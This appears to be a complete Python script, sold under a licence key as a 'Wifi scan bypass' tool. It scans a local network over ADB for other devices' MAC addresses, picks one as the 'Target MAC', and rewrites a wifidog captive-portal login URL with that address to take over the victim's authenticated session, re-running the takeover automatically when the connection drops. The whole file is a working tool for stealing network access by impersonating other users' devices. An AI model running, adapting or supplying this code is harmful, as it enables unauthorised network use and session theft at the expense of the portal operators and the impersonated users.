import os
import re
import sys
import time
import json
import uuid
import socket
import hashlib
import base64
import string
import random
import shutil
import subprocess
import urllib3
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ==================== COLORS ====================
CYAN    = "\033[1;36m"
YELLOW  = "\033[1;33m"
GREEN   = "\033[1;32m"
RED     = "\033[1;31m"
BLUE    = "\033[0;34m"
WHITE   = "\033[1;37m"
MAGENTA = "\033[1;35m"
RESET   = "\033[0m"
DG      = "\033[0;32m"
DW      = "\033[0;37m"
BOLD    = "\033[1m"

# ==================== AES ====================
KEY_HEX = "000102030405060708090a0b0c0d0e0f"
IV_HEX  = "101112131415161718191a1b1c1d1e1f"
key = bytes.fromhex(KEY_HEX)
iv  = bytes.fromhex(IV_HEX)

def aes_encrypt(plain_text: str) -> str:
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(cipher.encrypt(pad(plain_text.encode(), AES.block_size))).decode()
    else:
        return base64.b64encode(plain_text.encode()).decode()

def aes_decrypt(token: str) -> str:
    if HAS_CRYPTO:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(base64.b64decode(token)), AES.block_size).decode()
    else:
        return base64.b64decode(token).decode()

# ==================== PATHS & GLOBAL STATE ====================
DEV_FILE       = os.path.expanduser("~/.rj_devid")
KEY_FILE       = os.path.expanduser("~/.rj_key")
ADB_IP_FILE    = os.path.expanduser("~/.rj_adb_ip")
ADB_GW_FILE    = os.path.expanduser("~/.rj_adb_gw")
WIFI_SSID_FILE = os.path.expanduser("~/.rj_wifi_ssid")
SESSION_FILE   = os.path.expanduser("~/.rj_session")

SELECTED_MAC   = None
SELECTED_NAME  = "Unknown"
PORTAL_URL     = None
SCANNED_DEVICES = []
ACTIVE_DEVICES  = []
GATEWAY_IP      = None

# ==================== DEVICE ID ====================
def get_device_id() -> str:
    if os.path.exists(DEV_FILE):
        return open(DEV_FILE).read().strip()
    seed = socket.gethostname()
    try:
        seed += str(uuid.getnode())
    except:
        pass
    h = hashlib.sha256(seed.encode()).hexdigest()[:12].upper()
    dev_id = f"DEV-{h}"
    with open(DEV_FILE, "w") as f:
        f.write(dev_id)
    return dev_id

DEVICE_ID = get_device_id()

# ==================== SESSION SAVE / LOAD ====================
def save_session():
    try:
        data = {
            "portal_url":     PORTAL_URL,
            "selected_mac":   SELECTED_MAC,
            "selected_name":  SELECTED_NAME,
            "gateway_ip":     GATEWAY_IP,
            "active_devices": ACTIVE_DEVICES,
            "scanned_devices": SCANNED_DEVICES,
        }
        with open(SESSION_FILE, "w") as f:
            json.dump(data, f)
    except:
        pass

def load_session():
    global PORTAL_URL, SELECTED_MAC, SELECTED_NAME, GATEWAY_IP, ACTIVE_DEVICES, SCANNED_DEVICES
    if not os.path.exists(SESSION_FILE):
        return False
    try:
        with open(SESSION_FILE) as f:
            data = json.load(f)
        PORTAL_URL      = data.get("portal_url")
        SELECTED_MAC    = data.get("selected_mac")
        SELECTED_NAME   = data.get("selected_name", "Unknown")
        GATEWAY_IP      = data.get("gateway_ip")
        ACTIVE_DEVICES  = data.get("active_devices", [])
        SCANNED_DEVICES = data.get("scanned_devices", [])
        if PORTAL_URL and SELECTED_MAC:
            return True
    except:
        pass
    return False

# ==================== KEY / LICENSE ====================
def load_expiry():
    if not os.path.exists(KEY_FILE):
        return None
    try:
        raw = open(KEY_FILE).read().strip()
        dec = aes_decrypt(raw)
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        if time.time() > exp:
            return None
        return exp
    except:
        return None

REVOKED_SENTINEL = "REVOKED"

def save_key(key_str: str):
    try:
        dec = aes_decrypt(key_str.strip())
        dev, ts = dec.split("|", 1)
        if dev != DEVICE_ID:
            return None
        exp = float(ts)
        with open(KEY_FILE, "w") as f:
            f.write(key_str.strip())
        if time.time() > exp:
            return REVOKED_SENTINEL
        return exp
    except:
        return None

def fmt_expiry(ts: float) -> str:
    remain = max(0, int(ts - time.time()))
    d = remain // 86400
    h = (remain % 86400) // 3600
    m = (remain % 3600) // 60
    return f"{d}d {h}h {m}min"

# ==================== BANNER ====================
SKYBY_ART = [
    r"   _____   _  __ __     __   ____   __     __",
    r"  / ____| | |/ / \ \   / /  |  _ \  \ \   / /",
    r" | (___   | ' /   \ \_/ /   | |_) |  \ \_/ / ",
    r"  \___ \  |  <     \   /    |  _ <    \   /  ",
    r"  ____) | | . \     | |     | |_) |    | |   ",
    r" |_____/  |_|\_\    |_|     |____/     |_|   ",
]

def term_width() -> int:
    try:
        return shutil.get_terminal_size().columns
    except:
        return 60

def cprint(text: str, color: str = ""):
    clean = re.sub(r'\033\[[0-9;]*m', '', text)
    p = max(0, (term_width() - len(clean)) // 2)
    print(" " * p + color + text + RESET)

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def _sep() -> str:
    return f"{YELLOW}{'-' * term_width()}{RESET}"

def print_header(expiry=None):
    clear()
    print()
    for line in SKYBY_ART:
        cprint(line, GREEN)
    print()
    cprint("[ Wifi scan bypass ]", YELLOW)
    cprint("Telegram -> @paing_3521", GREEN)
    print(_sep())
    print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
    if expiry:
        print(f"{DG}[*] Expiry    : {GREEN}{fmt_expiry(expiry)}{RESET}")
    else:
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
    
    current_ssid = get_wifi_ssid()
    if current_ssid:
        print(f"{DG}[*] WiFi Name : {GREEN}{current_ssid}{RESET}")
    
    gw = get_gateway_ip()
    if gw:
        print(f"{DG}[*] Router IP : {GREEN}{gw}{RESET}")
        
    if SELECTED_MAC:
        print(f"{DG}[*] Target MAC: {YELLOW}{SELECTED_MAC}{RESET}  ({SELECTED_NAME})")
    if PORTAL_URL:
        short_url = PORTAL_URL[:55] + "..." if len(PORTAL_URL) > 58 else PORTAL_URL
        print(f"{DG}[*] Portal URL: {CYAN}{short_url}{RESET}")
    print(_sep())

# ==================== HELPERS ====================
def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def check_adb():
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        lines = result.stdout.splitlines()
        for line in lines[1:]:
            if line.strip() and "device" in line and "offline" not in line:
                return True
        return False
    except:
        return False

def get_last_adb_ip():
    if os.path.exists(ADB_IP_FILE):
        return open(ADB_IP_FILE).read().strip()
    return None

def save_adb_ip(ip_port: str):
    with open(ADB_IP_FILE, "w") as f:
        f.write(ip_port.strip())

def get_last_adb_gw():
    if os.path.exists(ADB_GW_FILE):
        return open(ADB_GW_FILE).read().strip()
    return None

def save_adb_gw(gw):
    with open(ADB_GW_FILE, "w") as f:
        f.write(gw.strip())

def get_last_wifi_ssid():
    if os.path.exists(WIFI_SSID_FILE):
        return open(WIFI_SSID_FILE).read().strip()
    return None

def save_wifi_ssid(ssid):
    with open(WIFI_SSID_FILE, "w") as f:
        f.write(ssid.strip())

def get_wifi_ssid():
    try:
        out = subprocess.check_output(["termux-wifi-connectioninfo"], timeout=5, stderr=subprocess.DEVNULL).decode()
        data = json.loads(out)
        ssid = data.get("ssid", "").strip().strip('"')
        if ssid: return ssid
    except: pass
    try:
        out = subprocess.check_output(["iw", "wlan0", "link"], timeout=3, stderr=subprocess.DEVNULL).decode()
        m = re.search(r'SSID:\s*(.+)', out)
        if m: return m.group(1).strip()
    except: pass
    try:
        out = subprocess.check_output(["adb", "shell", "dumpsys", "wifi"], timeout=5, stderr=subprocess.DEVNULL).decode()
        m = re.search(r'SSID: "?([^",\n]+)"?', out)
        if m:
            ssid = m.group(1).strip()
            if ssid and ssid != "<unknown ssid>": return ssid
    except: pass
    return None

def get_gateway_ip():
    try:
        output = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode()
        match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        if match: return match.group(1)
    except: pass
    if check_adb():
        try:
            output = subprocess.check_output(["adb", "shell", "ip", "route"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match: return match.group(1)
        except: pass
    return None

def adb_connect_step():
    current_gw = get_gateway_ip()
    current_ssid = get_wifi_ssid()
    last_gw = get_last_adb_gw()
    last_ssid = get_last_wifi_ssid()
    last_ip = get_last_adb_ip()

    # Check if we are on the same WiFi as last ADB connection
    if last_ip and last_gw and current_gw and last_gw == current_gw:
        if check_adb():
            return True
        print(f"{YELLOW}[*] Attempting auto-reconnect to ADB: {last_ip}...{RESET}")
        try:
            r = subprocess.run(["adb", "connect", last_ip], capture_output=True, text=True, timeout=8)
            if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
                print(f"{GREEN}[ ✓ ] ADB Auto-reconnected!{RESET}")
                return True
        except: pass

    if check_adb():
        if current_gw: save_adb_gw(current_gw)
        if current_ssid: save_wifi_ssid(current_ssid)
        return True

    print(f"{YELLOW}[*] ADB not connected. Enter IP:PORT to connect.{RESET}")
    ip_port = input(f"{YELLOW}[?] Enter ADB IP:PORT (or skip): {RESET}").strip()
    if not ip_port: return False
    try:
        r = subprocess.run(["adb", "connect", ip_port], capture_output=True, text=True, timeout=8)
        if "connected" in r.stdout.lower() and "unable" not in r.stdout.lower():
            save_adb_ip(ip_port)
            if current_gw: save_adb_gw(current_gw)
            if current_ssid: save_wifi_ssid(current_ssid)
            print(f"{GREEN}[ ✓ ] ADB Connected successfully!{RESET}")
            return True
    except: pass
    return False

def monitor_connection(portal_url, mac, sid):
    print(f"\n{CYAN}[*] Keep-Alive & Auto-Reconnect started...{RESET}")
    while True:
        try:
            time.sleep(25)
            test_url = "http://connectivitycheck.gstatic.com/generate_204"
            resp = requests.get(test_url, timeout=5, allow_redirects=False)
            if resp.status_code == 204:
                continue
            
            print(f"\n{YELLOW}[!] Connection dropped. Attempting auto-reconnect...{RESET}")
            ok, new_sid = run_bypass_for_mac(portal_url, mac)
            if ok:
                sid = new_sid
                print(f"{GREEN}[ ✓ ] Reconnected successfully!{RESET}")
        except KeyboardInterrupt:
            break
        except:
            time.sleep(5)

def run_bypass_for_mac(portal_url, mac):
    try:
        api_url = portal_url.replace("/auth/wifidogAuth/login", "/api/auth/wifidog?stage=portal&")
        new_url = replace_mac(api_url, mac)
        if "mac=" not in new_url:
            sep = "&" if "?" in new_url else "?"
            new_url = new_url + f"{sep}mac={mac}"
        
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Dalvik/2.1.0"})
        resp = sess.get(new_url, timeout=10, allow_redirects=True, verify=False)
        
        s_id = None
        if "sessionId=" in resp.url:
            s_id = resp.url.split("sessionId=")[1].split("&")[0]
        if not s_id:
            m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp.text)
            if m: s_id = m.group(1)
            
        if s_id:
            return True, s_id
    except: pass
    return False, None

# ==================== OPTIONS ====================
def option_wifi_setup(expiry):
    global SCANNED_DEVICES, ACTIVE_DEVICES, SELECTED_MAC, SELECTED_NAME, GATEWAY_IP
    print_header(expiry)
    print(f"\n{CYAN}[*] WiFi Setup — Option 1{RESET}")
    print(_sep())
    ssid = get_wifi_ssid()
    gw = get_gateway_ip()
    if ssid:
        print(f"{GREEN}[ ✓ ] Connected WiFi : {WHITE}{ssid}{RESET}")
        save_wifi_ssid(ssid)
    else:
        print(f"{RED}[-] Could not detect WiFi Name.{RESET}")

    if gw:
        print(f"{GREEN}[ ✓ ] Router IP      : {WHITE}{gw}{RESET}")
        save_adb_gw(gw)
        GATEWAY_IP = gw
    else:
        print(f"{RED}[-] Could not detect Router IP.{RESET}")

    SCANNED_DEVICES = []
    ACTIVE_DEVICES = []
    save_session()
    print(f"\n{GREEN}[ ✓ ] Setup complete. Session data updated.{RESET}")
    input(f"\n{DW}Press Enter to return...{RESET}")

def option_mac_scan(expiry):
    global SCANNED_DEVICES
    print_header(expiry)
    print(f"\n{CYAN}[*] MAC Scan — Option 2{RESET}")
    print(_sep())
    
    if not adb_connect_step():
        print(f"{RED}[-] ADB Connection required for MAC Scan.{RESET}")
        input(f"\n{DW}Press Enter to return...{RESET}")
        return

    print(f"\n{YELLOW}[*] Scanning devices on network...{RESET}")
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "neigh"], stderr=subprocess.DEVNULL).decode()
        matches = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+dev\s+\w+\s+lladdr\s+([0-9a-fA-F:]{17})', output)
        if matches:
            SCANNED_DEVICES = [{"ip": m[0], "mac": m[1].upper(), "name": "Unknown"} for m in matches]
            print(f"{GREEN}[ ✓ ] Found {len(SCANNED_DEVICES)} devices.{RESET}")
            save_session()
        else:
            print(f"{YELLOW}[!] No devices found in ARP table.{RESET}")
    except:
        print(f"{RED}[-] Error scanning devices.{RESET}")
    
    input(f"\n{DW}Press Enter to return...{RESET}")

def option_auto_bypass(expiry):
    global PORTAL_URL, SELECTED_MAC
    print_header(expiry)
    print(f"\n{CYAN}[*] Auto Bypass — Option 7{RESET}")
    print(_sep())

    # 1. Check WiFi consistency
    current_gw = get_gateway_ip()
    last_gw = get_last_adb_gw()
    
    if not current_gw or (last_gw and current_gw != last_gw):
        print(f"{RED}[!] WiFi has changed or not detected. Please run Option 1 Setup.{RESET}")
        input(f"\n{DW}Press Enter to return...{RESET}")
        return

    # 2. Ensure ADB is connected (auto-reconnects if same WiFi)
    if not adb_connect_step():
        print(f"{RED}[-] ADB connection failed. Cannot proceed.{RESET}")
        input(f"\n{DW}Press Enter to return...{RESET}")
        return

    # 3. Check if we have required data
    if not PORTAL_URL:
        print(f"{YELLOW}[*] Portal URL missing. Detecting...{RESET}")
        option_get_portal_link(expiry)
        if not PORTAL_URL: return

    if not SELECTED_MAC:
        print(f"{RED}[-] No target MAC selected. Please run Option 2 and 4.{RESET}")
        input(f"\n{DW}Press Enter to return...{RESET}")
        return

    print(f"{GREEN}[*] Target MAC  : {WHITE}{SELECTED_MAC}{RESET}")
    print(f"{GREEN}[*] Portal URL  : {WHITE}{PORTAL_URL[:50]}...{RESET}")
    
    print(f"\n{YELLOW}[*] Running Bypass...{RESET}")
    ok, sid = run_bypass_for_mac(PORTAL_URL, SELECTED_MAC)
    if ok:
        print(f"{GREEN}[ ✓ ] Bypass Success! Session ID: {sid}{RESET}")
        monitor_connection(PORTAL_URL, SELECTED_MAC, sid)
    else:
        print(f"{RED}[-] Bypass Failed.{RESET}")
    
    input(f"\n{DW}Press Enter to return...{RESET}")

def option_get_portal_link(expiry):
    global PORTAL_URL
    print_header(expiry)
    print(f"\n{CYAN}[*] Get Portal Link — Option 5{RESET}")
    print(_sep())
    print(f"\n{YELLOW}[*] Detecting WiFi Portal URL...{RESET}")
    detected_url = None
    test_urls = ["http://connectivitycheck.gstatic.com/generate_204", "http://1.1.1.1", "http://google.com"]
    for test_url in test_urls:
        try:
            resp = requests.get(test_url, timeout=5, allow_redirects=True, verify=False)
            if "wifidogAuth/login" in resp.url or "portal" in resp.url or "auth" in resp.url:
                detected_url = resp.url
                break
        except: continue
    if not detected_url:
        gw = get_gateway_ip()
        if gw:
            try:
                resp = requests.get(f"http://{gw}", timeout=3, allow_redirects=True, verify=False)
                if "wifidogAuth/login" in resp.url or "portal" in resp.url:
                    detected_url = resp.url
            except: pass
    if detected_url:
        PORTAL_URL = detected_url
        print(f"\n{GREEN}[ ✓ ] Portal Link Detected!{RESET}")
        print(f"{DG}[*] URL : {CYAN}{PORTAL_URL}{RESET}")
        save_session()
    else:
        print(f"\n{RED}[-] Failed to auto-detect portal link.{RESET}")
    print()
    input(f"{DW}Press Enter to return...{RESET}")

def main():
    expiry = load_expiry()
    if not expiry:
        expiry = key_screen()
    
    load_session()
    
    while True:
        print_header(expiry)
        print(f"  {GREEN}[1] WiFi Setup{RESET}")
        print(f"  {YELLOW}[2] MAC Scan{RESET}")
        print(f"  {GREEN}[3] Active Check{RESET}")
        print(f"  {YELLOW}[4] Select Target{RESET}")
        print(f"  {CYAN}[5] Get Portal Link{RESET}")
        print(f"  {YELLOW}[6] Encode Session URL{RESET}")
        print(f"  {GREEN}[7] Auto Bypass{RESET}")
        print(f"  {RED}[8] Delete Key{RESET}")
        print(f"  {RED}[0] Exit{RESET}")
        print(_sep())
        
        ch = input(f"  {CYAN}Select Option : {RESET}").strip()
        if ch == "1": option_wifi_setup(expiry)
        elif ch == "2": option_mac_scan(expiry)
        elif ch == "7": option_auto_bypass(expiry)
        elif ch == "5": option_get_portal_link(expiry)
        elif ch == "8":
            if os.path.exists(KEY_FILE): os.remove(KEY_FILE)
            print(f"\n{GREEN}[ ✓ ] Key deleted.{RESET}")
            time.sleep(1)
            break
        elif ch == "0": break
        else: time.sleep(0.5)

def key_screen() -> float:
    while True:
        clear()
        print()
        for line in SKYBY_ART: cprint(line, GREEN)
        print()
        cprint("[ Wifi scan bypass ]", YELLOW)
        print(_sep())
        print(f"{DG}[*] Device ID : {CYAN}{DEVICE_ID}{RESET}")
        print(f"{DG}[*] Expiry    : {RED}Not Registered{RESET}")
        print(_sep())
        key_in = input(f"  {YELLOW}Enter Key : {RESET}").strip()
        if not key_in: continue
        result = save_key(key_in)
        if result and result != REVOKED_SENTINEL:
            return result
        time.sleep(1)

if __name__ == "__main__":
    main()
